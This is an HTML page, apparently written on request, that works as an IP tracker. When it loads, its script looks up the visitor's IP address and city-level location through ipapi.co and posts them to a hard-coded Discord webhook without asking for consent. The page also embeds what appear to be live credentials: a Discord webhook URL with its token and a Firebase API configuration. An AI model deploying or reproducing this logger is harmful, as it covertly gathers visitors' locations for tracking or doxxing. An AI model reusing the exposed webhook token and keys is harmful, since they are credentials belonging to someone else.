<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>IP Tracker com Firebase + Discord</title>
</head>
<body>
  <h1>Seu acesso</h1>
  <div id="info">Carregando...</div>

  <script>
    // Configuração Firebase (mantida conforme você pediu)
    const config = {
      apiKey: "AIzaSyDegW2sEjWvx3Ih7U6vs45Gp8PeXyfJ90w",
      authDomain: "cyber-a41d9.firebaseapp.com",
      projectId: "cyber-a41d9",
      storageBucket: "cyber-a41d9.appspot.com",
      messagingSenderId: "563443982918",
      appId: "1:563443982918:web:61cf4b88f1b4ddd89ee047",
      databaseURL: "https://cyber-a41d9-default-rtdb.firebaseio.com/"
    };

    // Seu webhook do Discord
    const webhookURL = "https://discord.com/api/webhooks/1519484333717459095/VPDh0-rxLraKrrjjEuSGSfGIi9Bb7L_GPeo7wN3q6tnmv0ODz4hjzuLBETkrHenM5Ra-";

    // Pega IP e localização via ipapi.co
    fetch("https://ipapi.co/json/")
      .then(r => r.json())
      .then(data => {
        const texto = `Novo acesso:
IP: ${data.ip}
Localização: ${data.country_name}, ${data.region}, ${data.city}
Hora: ${new Date().toLocaleString("pt-BR")}`;

        // Mostra na tela
        document.getElementById("info").innerText = texto;

        // Envia para Discord
        fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: texto })
        })
        .then(() => console.log("Enviado para Discord"))
        .catch(err => console.error("Erro:", err));
      })
      .catch(() => {
        document.getElementById("info").innerText = "Não foi possível obter dados.";
      });
  </script>

  <!-- Scripts Firebase (se quiser usar depois) -->
  <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
  <script>
    firebase.initializeApp(config);
    // Aqui você poderia salvar os dados no Firebase também, se quiser
  </script>
</body>
</html>
